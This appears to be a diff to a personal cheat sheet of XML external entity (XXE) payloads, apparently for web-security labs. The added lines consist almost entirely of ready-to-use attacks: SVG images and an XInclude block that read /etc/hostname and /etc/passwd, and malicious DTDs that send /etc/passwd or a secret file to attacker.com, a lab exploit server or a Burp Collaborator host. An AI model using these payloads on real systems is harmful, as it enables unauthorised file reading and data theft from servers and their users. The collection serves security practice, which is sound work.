@@ -6,6 +6,69 @@
 	<data>&xxe;</data>
 </root>
 
+##############################
+## XXE in image file format ##
+##############################
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname" >
+]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+#################################################
+## Blind XXE in image file format exfiltration ##
+#################################################
+## malicious dtd ##
+###################
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+##############
+## svg file ##
+##############
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg SYSTEM "http://your-server.com/malicious.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
+  <text x="0" y="20" font-size="16">&send;</text>
+</svg>
+
+
+
+##############
+## XInclude ##
+##############
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+
+
+
+
+
+#############################
+## exfil.dtd on the server ##
+#############################
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://exploit-0a5a00d8040ec14c8030cf7e010f006c.exploit-server.net/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+############################################
+## payload sent to vulnerable application ##
+############################################
+<?xml version="1.0" encoding="UTF-8" standalone='no'?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM
+"https://exploit-0a5a00d8040ec14c8030cf7e010f006c.exploit-server.net/exploit.dtd">
+  %xxe;
+]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+
+
 
 
 <?xml version="1.0"?>
@@ -19,6 +82,3 @@
 # exfil.dtd
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-COLLABORATOR.burpcollaborator.net/?leak=%file;'>">
 %all;
-
-
-
